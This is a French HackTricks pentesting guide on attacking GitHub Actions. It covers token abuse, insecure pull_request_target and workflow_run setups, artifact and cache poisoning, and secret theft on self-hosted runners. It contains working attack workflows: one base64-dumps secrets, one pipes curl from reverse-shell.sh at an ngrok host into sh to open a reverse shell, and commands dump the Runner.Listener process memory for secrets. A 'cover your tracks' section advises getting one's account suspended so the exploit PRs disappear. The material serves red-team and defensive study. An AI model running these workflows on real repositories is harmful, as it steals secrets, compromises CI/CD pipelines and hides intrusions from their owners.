# Abus des actions Github

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## Informations de base

Sur cette page, vous trouverez :

* Un **r√©sum√© de tous les impacts** d'un attaquant parvenant √† acc√©der √† une action Github.
* Diff√©rentes fa√ßons d'**acc√©der √† une action** :
  * Avoir des **permissions** pour cr√©er l'action.
  * Abuser des d√©clencheurs li√©s aux **demandes de tirage**.
  * Abuser d'autres techniques d'acc√®s **externe**.
  * **Pivoter** √† partir d'un d√©p√¥t d√©j√† compromis.
* Enfin, une section sur les **techniques de post-exploitation pour abuser d'une action de l'int√©rieur** (causer les impacts mentionn√©s).

## R√©sum√© des impacts

Pour une introduction sur [**Github Actions, consultez les informations de base**](../basic-github-information.md#github-actions).

Dans le cas o√π vous pouvez **ex√©cuter des actions Github arbitraires/injecter du code** dans un **d√©p√¥t**, vous pourriez √™tre en mesure de :

* **Vol**er les **secrets** de ce d√©p√¥t/organisation.
* Si vous ne pouvez que injecter, vous pouvez voler ce qui est d√©j√† pr√©sent dans le flux de travail.
* Abuser des **privil√®ges du d√©p√¥t** pour acc√©der √† d'autres plateformes telles que AWS et GCP.
* **Ex√©cuter du code dans des travailleurs personnalis√©s** (si des travailleurs personnalis√©s sont utilis√©s) et essayer de pivoter √† partir de l√†.
* **√âcraser** le **code** du d√©p√¥t.
* Cela d√©pend des privil√®ges du `GITHUB_TOKEN` (s'il y en a).
* **Compromettre** les **d√©ploiements** et autres **artefacts**.
* Si le code d√©ploie ou stocke quelque chose, vous pourriez le modifier et obtenir un acc√®s suppl√©mentaire.

## GITHUB\_TOKEN

Ce "**secret**" (provenant de `${{ secrets.GITHUB_TOKEN }}` et `${{ github.token }}`) est donn√© lorsque l'administrateur active cette option :

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Ce jeton est le m√™me qu'une **application Github utilisera**, donc elle peut acc√©der aux m√™mes points de terminaison : [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github devrait publier un [**flux**](https://github.com/github/roadmap/issues/74) qui **autorise l'acc√®s inter-d√©p√¥ts** au sein de GitHub, afin qu'un d√©p√¥t puisse acc√©der √† d'autres d√©p√¥ts internes en utilisant le `GITHUB_TOKEN`.
{% endhint %}

Vous pouvez voir les **permissions** possibles de ce jeton dans : [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Notez que le jeton **expire apr√®s que le travail est termin√©**.\
Ces jetons ressemblent √† ceci : `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Quelques choses int√©ressantes que vous pouvez faire avec ce jeton :

{% tabs %}
{% tab title="Fusionner une PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Approuver la PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Cr√©er une PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Notez que dans plusieurs occasions, vous pourrez trouver **des jetons d'utilisateur GitHub √† l'int√©rieur des variables d'environnement de Github Actions ou dans les secrets**. Ces jetons peuvent vous donner plus de privil√®ges sur le d√©p√¥t et l'organisation.
{% endhint %}

<details>

<summary>Lister les secrets dans la sortie de l'action Github</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Obtenir un shell invers√© avec des secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Il est possible de v√©rifier les autorisations accord√©es √† un jeton Github dans les d√©p√¥ts d'autres utilisateurs **en v√©rifiant les journaux** des actions :

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## Ex√©cution Autoris√©e

{% hint style="info" %}
Cela serait la mani√®re la plus simple de compromettre les actions Github, car ce cas suppose que vous avez acc√®s pour **cr√©er un nouveau d√©p√¥t dans l'organisation**, ou avez des **privil√®ges d'√©criture sur un d√©p√¥t**.

Si vous √™tes dans ce sc√©nario, vous pouvez simplement v√©rifier les [techniques de post-exploitation](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### Ex√©cution depuis la Cr√©ation du D√©p√¥t

Dans le cas o√π les membres d'une organisation peuvent **cr√©er de nouveaux d√©p√¥ts** et que vous pouvez ex√©cuter des actions github, vous pouvez **cr√©er un nouveau d√©p√¥t et voler les secrets d√©finis au niveau de l'organisation**.

### Ex√©cution depuis une Nouvelle Branche

Si vous pouvez **cr√©er une nouvelle branche dans un d√©p√¥t qui contient d√©j√† une Action Github** configur√©e, vous pouvez la **modifier**, **t√©l√©charger** le contenu, puis **ex√©cuter cette action depuis la nouvelle branche**. De cette mani√®re, vous pouvez **exfiltrer les secrets au niveau du d√©p√¥t et de l'organisation** (mais vous devez savoir comment ils sont appel√©s).

Vous pouvez rendre l'action modifi√©e ex√©cutable **manuellement**, lorsqu'une **PR est cr√©√©e** ou lorsque **du code est pouss√©** (selon le niveau de bruit que vous souhaitez g√©n√©rer) :
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Ex√©cution Forked

{% hint style="info" %}
Il existe diff√©rents d√©clencheurs qui pourraient permettre √† un attaquant d'**ex√©cuter une action Github d'un autre d√©p√¥t**. Si ces actions d√©clenchables sont mal configur√©es, un attaquant pourrait les compromettre.
{% endhint %}

### `pull_request`

Le d√©clencheur de workflow **`pull_request`** ex√©cutera le workflow √† chaque fois qu'une pull request est re√ßue avec quelques exceptions : par d√©faut, si c'est la **premi√®re fois** que vous **collaborez**, un **mainteneur** devra **approuver** l'**ex√©cution** du workflow :

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Comme la **limite par d√©faut** est pour les **contributeurs de premi√®re fois**, vous pourriez contribuer en **corrigant un bug/une faute de frappe** valide, puis envoyer **d'autres PR pour abuser de vos nouveaux privil√®ges de `pull_request`**.

**J'ai test√© cela et cela ne fonctionne pas** : ~~Une autre option serait de cr√©er un compte avec le nom de quelqu'un qui a contribu√© au projet et a supprim√© son compte.~~
{% endhint %}

De plus, par d√©faut, **emp√™che les autorisations d'√©criture** et **l'acc√®s aux secrets** du d√©p√¥t cible comme mentionn√© dans la [**documentation**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories) :

> √Ä l'exception de `GITHUB_TOKEN`, **les secrets ne sont pas transmis au runner** lorsqu'un workflow est d√©clench√© √† partir d'un **d√©p√¥t fork√©**. Le **`GITHUB_TOKEN` a des autorisations en lecture seule** dans les pull requests **√† partir de d√©p√¥ts fork√©s**.

Un attaquant pourrait modifier la d√©finition de l'action Github afin d'ex√©cuter des choses arbitraires et d'ajouter des actions arbitraires. Cependant, il ne pourra pas voler de secrets ou √©craser le d√©p√¥t en raison des limitations mentionn√©es.

{% hint style="danger" %}
**Oui, si l'attaquant modifie dans la PR l'action github qui sera d√©clench√©e, son Github Action sera celui utilis√© et non celui du d√©p√¥t d'origine !**
{% endhint %}

Comme l'attaquant contr√¥le √©galement le code ex√©cut√©, m√™me s'il n'y a pas de secrets ou d'autorisations d'√©criture sur le `GITHUB_TOKEN`, un attaquant pourrait par exemple **t√©l√©verser des artefacts malveillants**.

### **`pull_request_target`**

Le d√©clencheur de workflow **`pull_request_target`** a **l'autorisation d'√©criture** sur le d√©p√¥t cible et **l'acc√®s aux secrets** (et ne demande pas d'autorisation).

Notez que le d√©clencheur de workflow **`pull_request_target`** **s'ex√©cute dans le contexte de base** et non dans celui donn√© par la PR (pour **ne pas ex√©cuter de code non fiable**). Pour plus d'informations sur `pull_request_target` [**consultez la documentation**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
De plus, pour plus d'informations sur cet usage sp√©cifique dangereux, consultez ce [**billet de blog github**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Il pourrait sembler que parce que le **workflow ex√©cut√©** est celui d√©fini dans la **base** et non dans la PR, il est **s√©curis√©** d'utiliser **`pull_request_target`**, mais il y a **quelques cas o√π ce n'est pas le cas**.

Et celui-ci aura **acc√®s aux secrets**.

### `workflow_run`

Le d√©clencheur [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) permet d'ex√©cuter un workflow √† partir d'un autre lorsque celui-ci est `termin√©`, `demand√©` ou `en cours`.

Dans cet exemple, un workflow est configur√© pour s'ex√©cuter apr√®s que le workflow s√©par√© "Ex√©cuter les tests" soit termin√© :
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
De plus, selon la documentation : Le flux de travail d√©marr√© par l'√©v√©nement `workflow_run` est capable d'**acc√©der √† des secrets et d'√©crire des jetons, m√™me si le flux de travail pr√©c√©dent ne l'√©tait pas**.

Ce type de flux de travail pourrait √™tre attaqu√© s'il d√©pend d'un **flux de travail** qui peut √™tre **d√©clench√©** par un utilisateur externe via **`pull_request`** ou **`pull_request_target`**. Quelques exemples vuln√©rables peuvent √™tre trouv√©s dans [**ce blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Le premier consiste en ce que le flux de travail d√©clench√© par `workflow_run` t√©l√©charge le code des attaquants : `${{ github.event.pull_request.head.sha }}`\
Le deuxi√®me consiste √† **transmettre** un **artefact** du code **non fiable** au flux de travail **`workflow_run`** et √† utiliser le contenu de cet artefact d'une mani√®re qui le rend **vuln√©rable √† une ex√©cution de code √† distance (RCE)**.

### `workflow_call`

√Ä FAIRE

√Ä FAIRE : V√©rifier si lorsqu'il est ex√©cut√© √† partir d'une `pull_request`, le code utilis√©/t√©l√©charg√© est celui de l'origine ou de la PR fork√©e

## Abus de l'ex√©cution fork√©e

Nous avons mentionn√© toutes les fa√ßons dont un attaquant externe pourrait parvenir √† faire ex√©cuter un flux de travail GitHub, voyons maintenant comment ces ex√©cutions, si mal configur√©es, pourraient √™tre abus√©es :

### Ex√©cution de v√©rification non fiable

Dans le cas de **`pull_request`,** le flux de travail sera ex√©cut√© dans le **contexte de la PR** (il ex√©cutera donc le **code malveillant des PR**), mais quelqu'un doit **l'autoriser en premier lieu** et il s'ex√©cutera avec certaines [limitations](./#pull\_request).

Dans le cas d'un flux de travail utilisant **`pull_request_target` ou `workflow_run`** qui d√©pend d'un flux de travail pouvant √™tre d√©clench√© √† partir de **`pull_request_target` ou `pull_request`**, le code du d√©p√¥t d'origine sera ex√©cut√©, donc l'**attaquant ne peut pas contr√¥ler le code ex√©cut√©**.

{% hint style="danger" %}
Cependant, si l'**action** a une **v√©rification PR explicite** qui **r√©cup√©rera le code de la PR** (et non de la base), elle utilisera le code contr√¥l√© par les attaquants. Par exemple (v√©rifiez la ligne 12 o√π le code de la PR est t√©l√©charg√©) :
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Fourni √† titre d'exemple uniquement.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Le code potentiellement **non fiable est ex√©cut√© pendant `npm install` ou `npm build`** car les scripts de construction et les **paquets r√©f√©renc√©s sont contr√¥l√©s par l'auteur de la PR**.

{% hint style="warning" %}
Un dork GitHub pour rechercher des actions vuln√©rables est : `event.pull_request pull_request_target extension:yml` cependant, il existe diff√©rentes fa√ßons de configurer les t√¢ches √† ex√©cuter de mani√®re s√©curis√©e m√™me si l'action est configur√©e de mani√®re non s√©curis√©e (comme utiliser des conditionnels sur l'acteur g√©n√©rant la PR).
{% endhint %}

### Injections de script de contexte <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Notez qu'il existe certains [**contextes GitHub**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) dont les valeurs sont **contr√¥l√©es** par l'utilisateur cr√©ant la PR. Si l'action GitHub utilise ces **donn√©es pour ex√©cuter quoi que ce soit**, cela pourrait entra√Æner une **ex√©cution de code arbitraire** :

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **Injection de script GITHUB\_ENV** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Selon la documentation : Vous pouvez rendre une **variable d'environnement disponible pour toutes les √©tapes suivantes** dans une t√¢che de flux de travail en d√©finissant ou en mettant √† jour la variable d'environnement et en l'√©crivant dans le fichier d'environnement **`GITHUB_ENV`**.

Si un attaquant pouvait **injecter une valeur** dans cette **variable env**, il pourrait injecter des variables d'environnement qui pourraient ex√©cuter du code dans les √©tapes suivantes telles que **LD\_PRELOAD** ou **NODE\_OPTIONS**.

Par exemple ([**ceci**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) et [**cela**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), imaginez un flux de travail qui fait confiance √† un artefact t√©l√©charg√© pour stocker son contenu dans la variable d'environnement **`GITHUB_ENV`**. Un attaquant pourrait t√©l√©charger quelque chose comme ceci pour le compromettre :

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

### Actions GitHub tierces vuln√©rables

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Comme mentionn√© dans [**cet article de blog**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), cette Action GitHub permet d'acc√©der √† des artefacts provenant de diff√©rents flux de travail et m√™me de d√©p√¥ts.

Le probl√®me est que si le param√®tre **`path`** n'est pas d√©fini, l'artefact est extrait dans le r√©pertoire actuel et peut remplacer des fichiers qui pourraient √™tre utilis√©s ult√©rieurement ou m√™me ex√©cut√©s dans le flux de travail. Par cons√©quent, si l'artefact est vuln√©rable, un attaquant pourrait en abuser pour compromettre d'autres flux de travail faisant confiance √† l'artefact.

Exemple de flux de travail vuln√©rable:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Cela pourrait √™tre attaqu√© avec ce flux de travail :
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Autre acc√®s externe

### D√©tournement de d√©p√¥t de namespace supprim√©

Si un compte change de nom, un autre utilisateur pourrait enregistrer un compte avec ce nom apr√®s un certain temps. Si un d√©p√¥t avait **moins de 100 √©toiles avant le changement de nom**, Github permettra au nouvel utilisateur enregistr√© avec le m√™me nom de cr√©er un **d√©p√¥t avec le m√™me nom** que celui supprim√©.

{% hint style="danger" %}
Donc, si une action utilise un d√©p√¥t d'un compte inexistant, il est toujours possible qu'un attaquant cr√©e ce compte et compromette l'action.
{% endhint %}

Si d'autres d√©p√¥ts utilisaient des **d√©pendances des d√©p√¥ts de cet utilisateur**, un attaquant pourra les d√©tourner. Voici une explication plus compl√®te : [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Pivotement de d√©p√¥t

{% hint style="info" %}
Dans cette section, nous parlerons des techniques qui permettraient de **pivoter d'un d√©p√¥t √† un autre** en supposant que nous avons un certain type d'acc√®s au premier (v√©rifiez la section pr√©c√©dente).
{% endhint %}

### Empoisonnement de cache

Un cache est maintenu entre les **ex√©cutions de flux de travail dans la m√™me branche**. Cela signifie que si un attaquant **compromet** un **paquet** qui est ensuite stock√© dans le cache et **t√©l√©charg√©** et ex√©cut√© par un flux de travail **plus privil√©gi√©**, il pourra **compromettre** √©galement ce flux de travail.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Empoisonnement d'artefacts

Les flux de travail pourraient utiliser des **artefacts d'autres flux de travail et m√™me de d√©p√¥ts**, si un attaquant parvient √† **compromettre** l'action Github qui **t√©l√©charge un artefact** qui est ensuite utilis√© par un autre flux de travail, il pourrait **compromettre les autres flux de travail** :

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Post-exploitation √† partir d'une action

### Acc√®s √† AWS et GCP via OIDC

Consultez les pages suivantes :

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Acc√®s aux secrets <a href="#accessing-secrets" id="accessing-secrets"></a>

Si vous injectez du contenu dans un script, il est int√©ressant de savoir comment acc√©der aux secrets :

* Si le secret ou le jeton est d√©fini comme une **variable d'environnement**, il peut √™tre directement acc√©d√© via l'environnement en utilisant **`printenv`**.

<details>

<summary>Liste des secrets dans la sortie de l'action Github</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Obtenir un shell invers√© avec des secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Si le secret est utilis√© **directement dans une expression**, le script shell g√©n√©r√© est stock√© **sur le disque** et est accessible.
* ```bash
cat /home/runner/work/_temp/*
```
* Pour une action JavaScript, les secrets sont envoy√©s via des variables d'environnement
* ```bash
ps axe | grep node
```
* Pour une **action personnalis√©e**, le risque peut varier en fonction de la mani√®re dont un programme utilise le secret obtenu √† partir de l'**argument** :

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Abus des runners auto-h√©berg√©s

La fa√ßon de trouver quelles **Actions Github sont ex√©cut√©es sur une infrastructure non-Github** est de rechercher **`runs-on: self-hosted`** dans la configuration yaml de l'Action Github.

Les runners **auto-h√©berg√©s** pourraient avoir acc√®s √† des **informations extra sensibles**, √† d'autres **syst√®mes r√©seau** (points d'extr√©mit√© vuln√©rables dans le r√©seau ? service de m√©tadonn√©es ?) ou, m√™me s'ils sont isol√©s et d√©truits, **plus d'une action pourrait √™tre ex√©cut√©e en m√™me temps** et l'action malveillante pourrait **voler les secrets** de l'autre.

Sur les runners auto-h√©berg√©s, il est √©galement possible d'obtenir les **secrets du processus \_Runner.Listener** qui contiendra tous les secrets des workflows √† n'importe quelle √©tape en vidant sa m√©moire :

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Consultez [**cet article pour plus d'informations**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Registre d'images Docker Github

Il est possible de cr√©er des actions Github qui vont **construire et stocker une image Docker √† l'int√©rieur de Github**.\
Un exemple peut √™tre trouv√© dans l'encadr√© suivant :

<details>

<summary>Construction de l'action Github pour pousser une image Docker</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Comme vous avez pu le voir dans le code pr√©c√©dent, le registre Github est h√©berg√© sur **`ghcr.io`**.

Un utilisateur avec des autorisations de lecture sur le d√©p√¥t pourra alors t√©l√©charger l'image Docker en utilisant un jeton d'acc√®s personnel :
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Ensuite, l'utilisateur pourrait rechercher **les secrets divulgu√©s dans les couches de l'image Docker :**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Informations sensibles dans les journaux des actions Github

M√™me si **Github** essaie de **d√©tecter les valeurs secr√®tes** dans les journaux des actions et **d'√©viter de les afficher**, **d'autres donn√©es sensibles** qui pourraient avoir √©t√© g√©n√©r√©es lors de l'ex√©cution de l'action ne seront pas cach√©es. Par exemple, un JWT sign√© avec une valeur secr√®te ne sera pas cach√© √† moins qu'il ne soit [sp√©cifiquement configur√©](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Couvrir vos traces

(Technique provenant de [**ici**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Tout d'abord, toute PR soumise est clairement visible par le public sur Github et par le compte GitHub cible. Sur GitHub par d√©faut, nous **ne pouvons pas supprimer une PR d'internet**, mais il y a une astuce. Pour les comptes Github qui sont **suspendus** par Github, toutes leurs **PR sont automatiquement supprim√©es** et retir√©es d'internet. Ainsi, pour cacher votre activit√©, vous devez soit faire suspendre votre **compte GitHub, soit faire signaler votre compte**. Cela permettrait de **cacher toutes vos activit√©s** sur GitHub de l'internet (essentiellement supprimer toutes vos PR d'exploitation)

Une organisation sur GitHub est tr√®s proactive pour signaler des comptes √† GitHub. Tout ce que vous avez √† faire est de partager "quelques choses" dans un probl√®me et ils veilleront √† ce que votre compte soit suspendu en 12 heures :p et voil√†, vous avez rendu votre exploitation invisible sur github.

{% hint style="warning" %}
La seule fa√ßon pour une organisation de d√©couvrir qu'elle a √©t√© cibl√©e est de v√©rifier les journaux GitHub depuis SIEM car depuis l'interface GitHub, la PR serait supprim√©e.
{% endhint %}

## Outils

Les outils suivants sont utiles pour trouver des flux de travail Github Actions et m√™me en trouver des vuln√©rables :

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
